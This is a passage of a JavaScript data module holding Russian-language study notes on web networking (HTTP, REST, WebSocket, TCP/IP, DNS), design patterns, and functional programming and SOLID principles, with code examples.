export const sections2 = [
  {
    id: 'network',
    title: 'СЕТЬ',
    icon: '🔗',
    color: '#66BB6A',
    topics: [
      { name: 'ip-адрес и hostName', level: '1', content: `**IP-адрес** — уникальный числовой идентификатор устройства в сети.\n• **IPv4:** 192.168.1.1 (4 октета, 32 бита, ~4.3 млрд адресов)\n• **IPv6:** 2001:0db8::1 (128 бит, практически неограничено)\n\n**Hostname** — человекочитаемое имя (example.com), преобразуется в IP через DNS.\n\n**localhost** = 127.0.0.1 (loopback). **0.0.0.0** — все интерфейсы.\n\n**Порт** — логический адрес приложения на устройстве (80 — HTTP, 443 — HTTPS, 3000 — dev).` },
      { name: 'Базовое понимание различий POST и GET', level: '2', content: `**GET:**\n• Параметры в URL (query string)\n• Кэшируется браузером\n• Ограничение длины URL (~2048 символов)\n• Идемпотентный (повторный запрос = тот же результат)\n• Для получения данных\n\n**POST:**\n• Данные в теле запроса (body)\n• НЕ кэшируется по умолчанию\n• Нет ограничения размера тела\n• НЕ идемпотентный\n• Для создания/изменения данных\n\n**Другие методы:** PUT (полная замена), PATCH (частичное обновление), DELETE (удаление), HEAD (только заголовки), OPTIONS (CORS preflight).` },
      { name: 'Query-параметры', level: '2', content: `Параметры в URL после \`?\`, разделённые \`&\`:\n\`\`\`\nhttps://api.com/users?page=1&limit=10&sort=name\n\`\`\`\n\n**URLSearchParams API:**\n\`\`\`js\nconst params = new URLSearchParams('page=1&limit=10');\nparams.get('page');      // '1'\nparams.set('page', '2');\nparams.append('filter', 'active');\nparams.toString();       // 'page=2&limit=10&filter=active'\n\`\`\`\n\n**Кодирование:** спецсимволы → encodeURIComponent() / decodeURIComponent().` },
      { name: 'REST API', level: '2', content: `**REST** — архитектурный стиль для API.\n\n**Принципы:**\n• Ресурсы идентифицируются URL: \`/users\`, \`/users/1\`\n• HTTP-методы как операции: GET (read), POST (create), PUT/PATCH (update), DELETE\n• **Stateless** — каждый запрос содержит всю необходимую информацию. Сервер не помнит предыдущие запросы.\n• Единый интерфейс\n\n**Stateless на примере:**\n\`\`\`\n// Не REST (с состоянием):\nЗапрос 1: "залогинься как user123"\nЗапрос 2: "дай мне мои заказы"  // сервер помнит кто ты\n\n// REST (stateless):\nЗапрос 1: "залогинься как user123" → получаешь токен\nЗапрос 2: "дай заказы, вот мой токен: Bearer xxx"\n\`\`\`\n\nПреимущества stateless: масштабируемость (любой сервер обработает запрос), простота (не нужно хранить сессии), надёжность (упавший сервер не теряет состояние клиентов).\n\nИменно поэтому JWT популярен в REST — клиент сам хранит токен и передаёт в каждом запросе.\n\n**Хорошие практики:**\n\`\`\`\nGET    /users       → список пользователей\nGET    /users/1     → конкретный пользователь\nPOST   /users       → создать пользователя\nPUT    /users/1     → обновить полностью\nPATCH  /users/1     → обновить частично\nDELETE /users/1     → удалить\n\`\`\`\n\n**Коды ответов:** 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error.` },
      { name: 'Понимание протокола HTTP', level: '2', content: `**HTTP (HyperText Transfer Protocol)** — протокол запрос-ответ.\n\n**Запрос:**\n\`\`\`\nGET /index.html HTTP/1.1\nHost: example.com\nAccept: text/html\nCookie: session=abc\n\`\`\`\n\n**Ответ:**\n\`\`\`\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: session=abc\nCache-Control: max-age=3600\n\`\`\`\n\n**HTTPS** — HTTP + TLS шифрование. TLS (Transport Layer Security) — протокол, который:\n• Шифрует данные — перехваченный трафик нечитаем\n• Аутентифицирует сервер — SSL-сертификат подтверждает что это действительно тот сервер\n• Обеспечивает целостность — данные не изменены в пути\n\nКак работает: клиент и сервер проводят TLS Handshake — договариваются об алгоритмах, обмениваются сертификатом, генерируют общий симметричный ключ. Дальше всё шифруется этим ключом.\n\n**Коды ответов:**\n• **1xx** — информационные (101 Switching Protocols — WebSocket)\n• **2xx** — успех (200 OK, 201 Created, 204 No Content)\n• **3xx** — редиректы (301 Moved Permanently, 302 Found, 304 Not Modified)\n• **4xx** — ошибка клиента (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)\n• **5xx** — ошибка сервера (500 Internal Server Error, 503 Service Unavailable)\n\n**Заголовки:**\n\n**Content-Type** — формат тела запроса/ответа:\n\`\`\`\napplication/json                — JSON\ntext/html; charset=utf-8        — HTML\ntext/plain                      — обычный текст\nmultipart/form-data             — загрузка файлов\napplication/x-www-form-urlencoded — данные формы\n\`\`\`\n\n**Authorization** — передача токена:\n\`\`\`\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9...\nAuthorization: Basic dXNlcjpwYXNz  // base64(login:password)\n\`\`\`\n\n**Cache-Control** — управление кэшем:\n\`\`\`\nno-cache       // всегда проверять актуальность\nno-store       // не кэшировать вообще\nmax-age=3600   // кэшировать 1 час\npublic         // можно кэшировать везде (CDN + браузер)\nprivate        // только браузер, не CDN\n\`\`\`\n\n**Accept** — ожидаемый формат ответа:\n\`\`\`\nAccept: application/json\nAccept: text/html\n\`\`\`\n\n**CORS** — управление доступом между доменами:\n\`\`\`\n// Ответ сервера:\nAccess-Control-Allow-Origin: https://mysite.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: Authorization\nAccess-Control-Allow-Credentials: true\n\n// Preflight-запрос браузера:\nOrigin: https://mysite.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Authorization\n\`\`\`\n\n**Set-Cookie / Cookie:**\n\`\`\`\n// Сервер устанавливает:\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n\n// Браузер отправляет:\nCookie: session=abc123\n\`\`\`\n\n**Прочие важные:**\n\`\`\`\nContent-Length: 348           // размер тела в байтах\nHost: api.example.com         // хост назначения\nUser-Agent: Mozilla/5.0...    // браузер/клиент\nReferer: https://site.com     // откуда пришёл запрос\nLocation: /new-url            // куда редиректить (3xx)\n\`\`\`

**HTTP/3:**
• Основан на **QUIC** (поверх UDP вместо TCP)
• Встроенное шифрование TLS 1.3 прямо в QUIC
• Нет head-of-line блокировки на транспортном уровне (в HTTP/2 один потерянный TCP-пакет блокирует все потоки одного соединения)
• **0-RTT** для повторных подключений — быстрее установление соединения
• **Connection migration** — соединение выживает при смене IP (переход Wi-Fi ↔ LTE, критично для мобильных)
• Поддерживается Cloudflare, Google, Fastly` },
      { name: 'Понимание протокола HTTP/2', level: '3', content: `**Главная проблема HTTP/1.1** — один запрос на одно соединение (или очередь). Браузер открывал до 6 параллельных соединений на домен — это лимит.\n\n**HTTP/2 решает это через:**\n\n**1. Мультиплексирование** — несколько запросов через одно соединение параллельно:\n\`\`\`\nHTTP/1.1: [запрос1] → [ответ1] → [запрос2] → [ответ2]  // очередь\nHTTP/2:   [запрос1] ↘\n          [запрос2] → [ответ1][ответ2][ответ3]  // параллельно, одно соединение\n          [запрос3] ↗\n\`\`\`\n\n**2. Сжатие заголовков (HPACK)** — в HTTP/1.1 заголовки передаются как текст при каждом запросе. HTTP/2 сжимает и кэширует — повторяющиеся не передаются.\n\n**3. Server Push** — сервер сам отправляет ресурсы которые понадобятся клиенту:\n\`\`\`\nКлиент запросил index.html →\nСервер отправляет: index.html + style.css + app.js\n// Не ждёт пока браузер разберёт HTML и запросит их\n\`\`\`\n\n**4. Бинарный протокол** — HTTP/1.1 текстовый, HTTP/2 бинарный → быстрее парсится, меньше ошибок.\n\n**5. Приоритизация** — можно указать какие запросы важнее (CSS важнее картинок).\n\n**Главный выигрыш — мультиплексирование.** Именно из-за него не нужны старые оптимизации HTTP/1.1: спрайты, domain sharding, конкатенация файлов.` },
      { name: 'Различие Long-Polling, Websockets, Server-Sent Events', level: '3', content: `**Проблема:** HTTP — запрос/ответ. Сервер не может сам инициировать отправку данных клиенту. Нужны специальные техники для realtime.\n\n---\n\n**Long Polling**\nКлиент отправляет запрос → сервер держит соединение открытым пока нет данных → появились данные, сервер отвечает → клиент сразу шлёт новый запрос.\n\`\`\`js\nasync function longPoll() {\n  const response = await fetch('/api/events');\n  const data = await response.json();\n  processData(data);\n  longPoll(); // сразу новый запрос\n}\n\`\`\`\nМинусы: новое HTTP-соединение каждый раз, задержки, неэффективно при высокой нагрузке.\nКогда: простые случаи, старые браузеры, редкие обновления.\n\n---\n\n**WebSocket**\nПолнодуплексное постоянное соединение. Клиент и сервер отправляют данные в любой момент.\n\nHandshake — клиент отправляет HTTP-запрос с заголовком Upgrade:\n\`\`\`\nGET /chat HTTP/1.1\nUpgrade: websocket       ← хочу переключиться на WebSocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZQ==\n\n→ HTTP/1.1 101 Switching Protocols  ← сервер согласен\n\`\`\`\nПосле этого то же TCP-соединение используется уже для WebSocket, не HTTP.\n\`\`\`js\nconst ws = new WebSocket('wss://site.com/chat');\n\nws.onopen = () => ws.send(JSON.stringify({ type: 'message', text: 'hello' }));\nws.onmessage = (e) => console.log(JSON.parse(e.data));\nws.onerror = (e) => console.error(e);\nws.onclose = (e) => console.log('закрыто', e.code);\n\nws.close(1000, 'работа завершена');\n\`\`\`\n\nКоды закрытия: 1000 — норма, 1001 — страница закрыта, 1006 — обрыв сети, 1011 — ошибка сервера.\n\nReconnect — вручную:\n\`\`\`js\nfunction connect() {\n  const ws = new WebSocket('wss://site.com');\n  ws.onclose = () => setTimeout(connect, 1000);\n}\n\`\`\`\nКогда: чат, игры, реалтайм коллаборация, трейдинг.\n\n---\n\n**SSE (Server-Sent Events)**\nОдностороннее соединение сервер → клиент. Обычный HTTP с Content-Type: text/event-stream. Автоматический reconnect встроен в браузер.\n\`\`\`js\n// Клиент:\nconst es = new EventSource('/stream');\nes.onmessage = (e) => console.log(e.data);\nes.addEventListener('update', (e) => console.log(e.data));\nes.close();\n\`\`\`\n\`\`\`js\n// Сервер (Node.js):\nres.setHeader('Content-Type', 'text/event-stream');\nres.setHeader('Cache-Control', 'no-cache');\n\nres.write('data: привет\\n\\n');              // простое сообщение\nres.write('event: update\\n');               // именованное событие\nres.write('data: {\"price\": 100}\\n\\n');\nres.write('id: 42\\n');                      // ID для reconnect\nres.write('data: сообщение\\n\\n');\nres.write('retry: 3000\\n\\n');              // задержка reconnect (мс)\n\`\`\`\nПри обрыве браузер переподключается сам и отправляет Last-Event-ID — сервер знает с какого события продолжать.\nКогда: лента новостей, уведомления, прогресс операции, live логи.\n\n---\n\n**Сравнение:**\n\n**Long Polling** — HTTP, двустороннее, новое соединение каждый раз, reconnect вручную, простой.\n**WebSocket** — WS/WSS, двустороннее, постоянное соединение, reconnect вручную, средний.\n**SSE** — HTTP, только сервер→клиент, постоянное соединение, reconnect автоматически, простой.` },
      { name: 'Базовое понимание TCP', level: '4', content: `**TCP (Transmission Control Protocol)** — протокол транспортного уровня. Обеспечивает надёжную доставку данных между двумя точками.\nИнтернет передаёт данные пакетами — они могут потеряться, прийти не в том порядке, задублироваться. TCP решает все эти проблемы.\n\n**Модель OSI (упрощённо):**\n\`\`\`\nПриложение: HTTP, WebSocket, FTP, DNS\nТранспорт:  TCP, UDP\nСеть:       IP\nКанал:      Ethernet, WiFi\nФизический: провода, радиоволны\n\`\`\`\nКаждый уровень использует нижний как транспорт. HTTP работает поверх TCP, TCP работает поверх IP.\n\n**3-way handshake — установка соединения:**\n\`\`\`\nКлиент → Сервер:  SYN          (хочу соединиться, мой seq=100)\nСервер → Клиент:  SYN + ACK    (согласен, мой seq=200, подтверждаю твой 101)\nКлиент → Сервер:  ACK          (принял, подтверждаю твой 201)\n\`\`\`\nПосле этого соединение установлено. Это причина задержки HTTP/1.1 — каждое новое соединение требует handshake.\n\n**Закрытие — 4-way handshake:**\n\`\`\`\nКлиент → Сервер:  FIN    (я закончил отправку)\nСервер → Клиент:  ACK    (принял)\nСервер → Клиент:  FIN    (я тоже закончил)\nКлиент → Сервер:  ACK    (принял, соединение закрыто)\n\`\`\`\n\n**Главные характеристики:**\n• **Надёжность** — каждый пакет подтверждается через ACK. Нет подтверждения → повтор отправки.\n• **Порядок** — каждый пакет имеет sequence number. Получатель собирает пакеты в правильном порядке даже если пришли вразнобой.\n• **Flow Control** — получатель сообщает сколько данных готов принять (window size). Отправитель не перегружает получателя.\n• **Congestion Control** — TCP снижает скорость если сеть перегружена.\n\n**TCP vs UDP:**\n**TCP** — гарантирует доставку, сохраняет порядок, медленнее, 3-way handshake, высокий overhead.\n**UDP** — без гарантий, порядок не гарантирован, быстрее, нет handshake, минимальный overhead.\n\nTCP используют: HTTP, HTTPS, WebSocket, FTP, SSH.\nUDP используют: видеозвонки (WebRTC, Zoom), онлайн игры, DNS, стриминг, HTTP/3 (QUIC).\n\n**Почему UDP для видео/игр:**\nПотеря пакета в TCP → повтор → задержка. В видеозвонке лучше пропустить кадр чем ждать повтора — это создаёт заморозку. UDP просто отбрасывает потерянный пакет и продолжает.\n\n**HTTP/3 и QUIC:**\nHTTP/3 работает поверх QUIC — протокол на базе UDP но с надёжностью на уровне приложения: нет 3-way handshake, мультиплексирование без head-of-line blocking, встроенное шифрование TLS 1.3.\n\n**Keep-Alive:**\nHTTP/1.1 по умолчанию держит TCP-соединение открытым для нескольких запросов (Connection: keep-alive). Без этого каждый запрос = новый TCP handshake. HTTP/2 идёт дальше — одно соединение для всех запросов.` },
      { name: 'Базовое понимание IP', level: '4', content: `**IP (Internet Protocol)** — протокол сетевого уровня. Отвечает за адресацию и маршрутизацию пакетов между сетями.\n\nTCP разбивает данные на пакеты. IP доставляет каждый пакет от отправителя к получателю через цепочку роутеров. IP не гарантирует доставку — это задача TCP.\n\n**Структура IP-пакета:**\n\`\`\`\nЗаголовок:\n  Source IP      — откуда пакет\n  Destination IP — куда пакет\n  TTL            — время жизни пакета\n  Protocol       — что внутри (TCP=6, UDP=17)\n  Checksum       — проверка целостности заголовка\nДанные (payload) — TCP сегмент внутри\n\`\`\`\n\n**TTL (Time To Live):**\nКаждый пакет имеет счётчик TTL (обычно 64 или 128). Каждый роутер уменьшает TTL на 1. TTL = 0 → пакет уничтожается → отправителю приходит ICMP "Time Exceeded".\nЗачем: предотвращает бесконечную циркуляцию потерявшихся пакетов.\n\`\`\`bash\ntraceroute google.com\n# Отправляет пакеты с TTL=1, TTL=2, TTL=3...\n# Каждый роутер отвечает — видим весь маршрут\n\`\`\`\n\n**Маршрутизация:**\n\`\`\`\nТвой компьютер → Домашний роутер → Роутер провайдера → ... → Сервер\n\`\`\`\nКаждый роутер смотрит на Destination IP и решает куда передать дальше по таблице маршрутизации. IP не знает весь путь заранее — каждый роутер решает локально.\n\n**IPv4 vs IPv6:**\n• **IPv4** — 32 бита (192.168.1.1), ~4 млрд адресов, закончились, решение: NAT\n• **IPv6** — 128 бит (2001:0db8::8a2e:0370:7334), 340 ундециллионов адресов, встроенный IPSec, нет NAT\n\n**NAT (Network Address Translation):**\nИз-за нехватки IPv4 адресов несколько устройств домашней сети выходят в интернет через один публичный IP:\n\`\`\`\n192.168.1.2 (телефон)   ┐\n192.168.1.3 (ноутбук)   ├─→ Роутер (NAT) → 85.142.10.5 (один публичный IP)\n192.168.1.4 (телевизор) ┘\n\`\`\`\nПриватные диапазоны (не маршрутизируются в интернете):\n\`\`\`\n10.0.0.0/8       — большие сети\n172.16.0.0/12    — средние сети\n192.168.0.0/16   — домашние сети\n127.0.0.0/8      — loopback (localhost)\n\`\`\`\n\n**ICMP (Internet Control Message Protocol)** — протокол служебных сообщений сетевого уровня. Работает поверх IP, но не для передачи данных — только для диагностики и уведомлений об ошибках. Не имеет портов (это не TCP/UDP).\n\nОсновные сообщения:\n\`\`\`\nEcho Request / Echo Reply  — ping: проверка доступности хоста\nTime Exceeded              — TTL истёк (роутер уничтожил пакет)\nDestination Unreachable    — хост/порт/сеть недоступны\nRedirect                   — роутер сообщает о более коротком маршруте\n\`\`\`\n\`\`\`bash\nping google.com       # шлёт Echo Request, ждёт Echo Reply — измеряет RTT\ntraceroute google.com # шлёт пакеты с TTL=1,2,3... — каждый роутер отвечает Time Exceeded\n\`\`\`\n\nICMP может быть заблокирован файрволом — тогда ping не ответит, но сайт при этом работает.` },
      { name: 'Базовое понимание DNS', level: '4', content: `**DNS (Domain Name System)** — распределённая система, которая преобразует доменное имя в IP-адрес. Работает по UDP, порт 53.

**Как браузер резолвит домен (порядок):**
\`\`\`
1. Кэш браузера
2. Кэш ОС
3. Файл /etc/hosts
4. Рекурсивный резолвер провайдера (или 1.1.1.1 / 8.8.8.8)
5. Резолвер идёт по иерархии: Root → TLD → Authoritative
\`\`\`

**Иерархия DNS:**
\`\`\`
Root серверы (.)           — 13 кластеров в мире, знают где TLD серверы
    ↓
TLD серверы (.com, .ru)    — знают где authoritative серверы каждого домена
    ↓
Authoritative серверы      — хранят реальные записи: google.com → 142.250.185.46
\`\`\`
Резолвер кэширует ответ на время TTL и не ходит по иерархии повторно.

**DNS записи:**
\`\`\`
A      — домен → IPv4:         example.com → 93.184.216.34
AAAA   — домен → IPv6:         example.com → 2606:2800::1
CNAME  — псевдоним:            www.example.com → example.com
                               (нельзя использовать для корневого домена!)
MX     — почтовый сервер:      example.com → mail.example.com (приоритет 10)
TXT    — текст:                верификация домена, SPF, DKIM записи
NS     — какие серверы хранят  записи домена (делегирование)
\`\`\`

**TTL (Time To Live)** — сколько секунд запись кэшируется. При смене IP все кэши хранят старый адрес пока TTL не истечёт. Типичные значения: 300 с (5 мин) — для частых изменений, 86400 с (24 ч) — для стабильных записей.

Практика: перед переездом сайта на новый IP заранее (за сутки) снизить TTL до 300 с — тогда после смены IP кэши устареют быстро.

**Файл hosts** — локальный оверрайд DNS, проверяется до обращения к серверу:
\`\`\`
# /etc/hosts (Mac/Linux) | C:\\Windows\\System32\\drivers\\etc\\hosts (Windows)
127.0.0.1       localhost
192.168.1.10    api.local     # локальная разработка
0.0.0.0         ads.example.com  # блокировка
\`\`\`

**DNS over HTTPS (DoH) и DNS over TLS (DoT):**
Обычный DNS — plaintext UDP, провайдер и все роутеры на пути видят все запросы (какие сайты посещаешь). DoH оборачивает DNS в HTTPS — трафик зашифрован и неотличим от обычного веб-трафика.
\`\`\`
Cloudflare: 1.1.1.1   (https://cloudflare-dns.com/dns-query)
Google:     8.8.8.8   (https://dns.google/dns-query)
\`\`\`` },
    ],
  },
  {
    id: 'patterns',
    title: 'ПАТТЕРНЫ',
    icon: '🧩',
    color: '#AB47BC',
    topics: [
      { name: 'DRY, KISS, YAGNI', level: '2', content: `**DRY (Don't Repeat Yourself):** каждая часть знания имеет единственное представление. Дублирование → вынести в функцию/модуль. Но: не путай совпадение кода с дублированием логики.\n\n**KISS (Keep It Simple, Stupid):** простое решение лучше сложного. Не усложняй без необходимости. Читаемость > краткость.\n\n**YAGNI (You Aren't Gonna Need It):** не реализуй функционал «на будущее». Делай только то, что нужно сейчас. Преждевременная абстракция — зло.` },
      { name: 'Навык использования и определения паттерна в коде: Observer', level: '3', content: `**Observer (Наблюдатель)** — объект уведомляет подписчиков о своих изменениях.\n\n\`\`\`js\nclass EventEmitter {\n  constructor() { this.listeners = {}; }\n  on(event, fn) {\n    (this.listeners[event] ||= []).push(fn);\n  }\n  off(event, fn) {\n    this.listeners[event] = this.listeners[event]?.filter(f => f !== fn);\n  }\n  emit(event, data) {\n    this.listeners[event]?.forEach(fn => fn(data));\n  }\n}\n\`\`\`\n\n**Где в JS:** addEventListener, RxJS, EventEmitter в Node.js, Redux store.subscribe(), Vue reactivity.` },
      { name: 'Factory Method, Prototype, Proxy, Singleton', level: '3', content: `**Singleton** — гарантирует один экземпляр класса на всё приложение:
\`\`\`js
class Database {
  static instance = null;

  constructor(url) {
    if (Database.instance) return Database.instance;
    this.url = url;
    Database.instance = this;
  }
}

const db1 = new Database('localhost');
const db2 = new Database('remotehost');
db1 === db2; // true
db2.url;     // 'localhost' — второй конструктор проигнорировался
\`\`\`
В JS ES-модули — уже Singleton: экспортируемый объект кэшируется, все импорты получают одну ссылку.
Где: подключение к БД, логгер, конфиг, Redux store.
Минусы: глобальное состояние, сложно тестировать.

**Factory Method** — инкапсулирует логику создания объектов, вызывающий код не знает какой конкретно класс создаётся:
\`\`\`js
function createTransport(type) {
  switch(type) {
    case 'car':   return new Car();
    case 'bike':  return new Bike();
    case 'truck': return new Truck();
    default: throw new Error('Unknown type');
  }
}
\`\`\`
ООП вариант — подкласс переопределяет метод создания:
\`\`\`js
class Dialog {
  createButton() { throw new Error('Переопредели меня!'); }
  render() { this.createButton().render(); }
}
class WindowsDialog extends Dialog {
  createButton() { return new WindowsButton(); }
}
\`\`\`
Где: \`React.createElement\`, \`document.createElement\`, UI под разные платформы.

**Prototype (паттерн)** — создаёт объекты клонированием существующего. Используется когда создание дорого:
\`\`\`js
class Circle {
  constructor(radius, color) {
    this.radius = radius;
    this.color = color;
  }
  clone() {
    return Object.assign(Object.create(Object.getPrototypeOf(this)), this);
  }
}

const c1 = new Circle(10, 'red');
const c2 = c1.clone();
c2.color = 'blue';
c1.color; // 'red' — оригинал не тронут
\`\`\`
Встроенные методы:
\`\`\`js
const shallow = { ...original };                         // поверхностное
const deep = structuredClone(original);                  // глубокое (современный способ)
const deep2 = JSON.parse(JSON.stringify(original));      // старый способ, теряет функции/undefined
\`\`\`
Где: копирование конфигов, undo/redo снапшоты, клонирование игровых объектов.

**Proxy** — обёртка, перехватывающая операции с объектом:
\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`Читаем: \${prop}\`);
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    if (prop === 'age' && typeof value !== 'number')
      throw new TypeError('Только числа!');
    return Reflect.set(target, prop, value, receiver);
  },
  deleteProperty(target, prop) {
    return Reflect.deleteProperty(target, prop);
  }
};
const data = new Proxy({}, handler);
\`\`\`
Применение:
\`\`\`js
// Реактивность (как Vue 3):
function reactive(obj) {
  return new Proxy(obj, {
    set(target, prop, value) {
      target[prop] = value;
      render();
      return true;
    }
  });
}

// Кэширование:
const cached = new Proxy(api, {
  get(target, method) {
    return async (...args) => {
      const key = \`\${method}:\${JSON.stringify(args)}\`;
      if (cache.has(key)) return cache.get(key);
      const result = await target[method](...args);
      cache.set(key, result);
      return result;
    };
  }
});
\`\`\`
Где: Vue 3 реактивность, MobX, валидация, логирование, кэширование.

**Сравнение:**
\`\`\`
Паттерн    Задача                  Когда
Singleton  один экземпляр          глобальные сервисы, конфиги
Factory    инкапсуляция создания   разные типы объектов
Prototype  клонирование            дорогое создание объектов
Proxy      перехват операций       валидация, кэш, реактивность
\`\`\`` },
      { name: 'Навык использования и определения паттерна в коде: Decorator', level: '3', content: `**Decorator** — оборачивает объект/функцию, добавляя поведение без изменения оригинала.\n\n\`\`\`js\nfunction withLogging(fn) {\n  return function(...args) {\n    console.log('Calling', fn.name, args);\n    const result = fn.apply(this, args);\n    console.log('Result:', result);\n    return result;\n  };\n}\n\nconst add = (a, b) => a + b;\nconst loggedAdd = withLogging(add);\nloggedAdd(2, 3); // Calling add [2,3] → Result: 5\n\`\`\`\n\n**TC39 Decorators (Stage 3):**\n\`\`\`js\n@logged\nclass MyClass { ... }\n\`\`\`\n\n**Где:** HOC в React, middleware в Express/Redux, TypeORM entity decorators.` },
      { name: 'Навык использования и определения паттерна в коде: Dependency Injection', level: '4', content: `**Dependency Injection (DI)** — паттерн при котором объект получает зависимости снаружи вместо того чтобы создавать их самостоятельно.

**Проблема без DI** — жёсткая связь, нельзя протестировать без реальных сервисов:
\`\`\`js
class UserService {
  constructor() {
    this.db = new Database('localhost'); // нельзя заменить
    this.logger = new Logger();
  }
}
\`\`\`

**Решение с DI:**
\`\`\`js
class UserService {
  constructor(db, logger) {
    this.db = db;
    this.logger = logger;
  }
}

// Production:
const service = new UserService(new Database('localhost'), new Logger());

// Тесты — подменяем моками:
const service = new UserService(mockDb, mockLogger);
\`\`\`

**Три способа внедрения:**
\`\`\`js
// 1. Constructor Injection — самый популярный:
class Service {
  constructor(dep) { this.dep = dep; }
}

// 2. Property Injection — через setter:
const s = new Service();
s.setDependency(new Dep());

// 3. Method Injection — через параметр метода:
class Service {
  doWork(dep) { dep.execute(); }
}
\`\`\`

**DI Container** — в больших приложениях регистрируют зависимости, контейнер создаёт и внедряет сам.

**Что решает контейнер:**
- **Бойлерплейт пересборки** — без контейнера при добавлении новой зависимости нужно обновлять все места где создаётся объект. Контейнер знает граф и пересобирает сам.
- **Singleton-семантика** — контейнер гарантирует один экземпляр на всё приложение (DatabaseConnection, Logger). Без контейнера нужно следить вручную.
- **Порядок зависимостей** — контейнер сам вычисляет порядок создания: сначала \`Database\`, потом \`UserService\`, потом \`AuthController\`. Руками это error-prone при десятках сервисов.
- **Циклические зависимости** — \`A → B → A\`. Контейнер это обнаружит и бросит ошибку вместо тихого краша. Хорошие контейнеры умеют разрешать циклы через lazy-inject (прокси).
\`\`\`js
class Container {
  constructor() { this.bindings = new Map(); this.singletons = new Map(); }

  bind(name, factory, singleton = false) {
    this.bindings.set(name, { factory, singleton });
  }

  make(name) {
    const { factory, singleton } = this.bindings.get(name);
    if (singleton) {
      if (!this.singletons.has(name)) this.singletons.set(name, factory(this));
      return this.singletons.get(name);
    }
    return factory(this);
  }
}

const c = new Container();
c.bind('db', () => new Database('localhost'), true); // singleton
c.bind('userService', (c) => new UserService(c.make('db')));

const userService = c.make('userService');
\`\`\`

**DI в React — через Context:**
\`\`\`js
const ServiceContext = createContext(null);

function App() {
  const services = { userService: new UserService(new Database()) };
  return (
    <ServiceContext.Provider value={services}>
      <Router />
    </ServiceContext.Provider>
  );
}

function UserProfile() {
  const { userService } = useContext(ServiceContext); // получает снаружи
}
\`\`\`

**DI в NestJS — через декораторы:**
\`\`\`ts
@Injectable()
class UserService {
  constructor(private db: Database, private logger: LoggerService) {}
}

@Module({ providers: [UserService, Database, LoggerService] })
class AppModule {}
\`\`\`

**Принцип D из SOLID (Dependency Inversion):**
\`\`\`ts
// Плохо — зависим от конкретного класса:
class UserService { constructor(private db: MySQLDatabase) {} }

// Хорошо — зависим от интерфейса:
interface Database { save(data: any): void; }
class UserService { constructor(private db: Database) {} }
// Теперь можно передать MySQL, PostgreSQL, MongoDB — любую реализацию
\`\`\`

**Преимущества:** тестируемость (моки), слабая связность, гибкость замены реализации.` },
    ],
  },
  {
    id: 'dev',
    title: 'РАЗРАБОТКА ПО',
    icon: '⚙️',
    color: '#78909C',
    topics: [
      { name: 'Функциональное программирование, его отличие от ООП', level: '2', content: `**ФП:**\n• Данные неизменяемы (immutability)\n• Чистые функции (нет побочных эффектов)\n• Функции — first-class citizens\n• Композиция функций\n• Декларативный стиль\n\n**ООП:**\n• Данные + поведение в объектах\n• Инкапсуляция, наследование, полиморфизм\n• Изменяемое состояние\n• Императивный стиль\n\n**В JS используются оба:** React (ФП — компоненты как чистые функции, иммутабельный state) + классы, наследование.

**Currying** — преобразование функции с N аргументами в цепочку функций с одним:
\`\`\`js
const add = a => b => a + b;
const add5 = add(5);
add5(3); // 8 — частичное применение

// Практика: предконфигурация
const fetchWith = baseUrl => endpoint => fetch(baseUrl + endpoint);
const api = fetchWith('https://api.example.com');
api('/users'); // настроен один раз, переиспользуется
\`\`\`

**Pipe / Compose** — объединение функций в цепочку (data pipeline):
\`\`\`js
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);

const transform = pipe(
  str => str.trim(),
  str => str.toLowerCase(),
  str => str.replace(/\s+/g, '-')
);
transform('  Hello World '); // 'hello-world'
\`\`\`

**Иммутабельность:** никогда не мутируй — возвращай новый объект/массив:
\`\`\`js
// ❌ мутация
state.count++;
arr.push(item);
// ✅ иммутабельно
{ ...state, count: state.count + 1 }
[...arr, item]
\`\`\`
Именно поэтому React не видит изменения при мутации state — ссылка та же.` },
      { name: 'SOLID, Cohesion и Coupling', level: '3', content: `**S — Single Responsibility:**
Класс/функция должна иметь одну причину для изменения — делать одно дело:
\`\`\`js
// Плохо — класс делает всё:
class User {
  constructor(name) { this.name = name; }
  save() { db.save(this); }         // работа с БД
  sendEmail() { email.send(this); } // отправка email
  render() { return \`<div>\${this.name}</div>\`; } // UI
}

// Хорошо — каждый класс своё дело:
class User { constructor(name) { this.name = name; } }
class UserRepository { save(user) { db.save(user); } }
class UserMailer { send(user) { email.send(user); } }
class UserComponent { render(user) { return \`<div>\${user.name}</div>\`; } }
\`\`\`

**O — Open/Closed:**
Открыт для расширения, закрыт для изменения:
\`\`\`js
// Плохо — каждый новый тип меняет функцию:
function getArea(shape) {
  if (shape.type === 'circle') return Math.PI * shape.radius ** 2;
  if (shape.type === 'square') return shape.side ** 2;
}

// Хорошо — расширяем без изменения:
class Circle { getArea() { return Math.PI * this.radius ** 2; } }
class Square { getArea() { return this.side ** 2; } }
class Triangle { getArea() { return 0.5 * this.base * this.height; } }
function getArea(shape) { return shape.getArea(); }
\`\`\`

**L — Liskov Substitution:**
Подкласс должен полностью заменять родителя без изменения поведения:
\`\`\`js
// Нарушение:
class Bird { fly() { return 'flying'; } }
class Penguin extends Bird {
  fly() { throw new Error('Пингвины не летают!'); } // ломает контракт!
}

// Правильно — разделить иерархию:
class Bird { }
class FlyingBird extends Bird { fly() { return 'flying'; } }
class Penguin extends Bird { swim() { return 'swimming'; } }
\`\`\`

**I — Interface Segregation:**
Не заставляй реализовывать методы которые не нужны:
\`\`\`ts
// Плохо — один большой интерфейс:
interface Worker { work(): void; eat(): void; sleep(): void; }
class Robot implements Worker {
  work() { }
  eat() { throw new Error('Роботы не едят!'); }
  sleep() { throw new Error('Роботы не спят!'); }
}

// Хорошо — маленькие интерфейсы:
interface Workable { work(): void; }
interface Eatable { eat(): void; }
class Robot implements Workable { work() { } }
